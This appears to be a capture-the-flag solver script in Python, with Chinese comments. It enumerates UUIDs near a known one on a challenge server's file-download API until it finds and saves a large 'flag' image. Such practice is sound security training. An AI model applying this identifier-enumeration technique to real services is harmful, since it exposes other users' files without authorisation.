import requests
from uuid import UUID

base = "http://challenge.xinshi.fun:36624/api/file/download/"
# 已知uuid
origin_uuid = UUID("72ddc765-caf6-43e3-941e-eeddf924f8df")

for i in range(-1000, 1000):
    # 这里以最后一组数字做加减，你也可以爆破中间的部分
    try_uuid = UUID(fields=(
        origin_uuid.time_low,
        origin_uuid.time_mid,
        origin_uuid.time_hi_version,
        origin_uuid.clock_seq_hi_variant,
        origin_uuid.clock_seq_low,
        (origin_uuid.node + i) % (1<<48)
    ))
    url = base + str(try_uuid)
    r = requests.get(url, stream=True)
    size = int(r.headers.get("Content-Length", 0))
    if size > 500*1024:
        print("可能的flag图片：", url, "大小：", size)
        with open("flag.png", "wb") as f:
            f.write(r.content)
        break
    else:
        print(i,"no")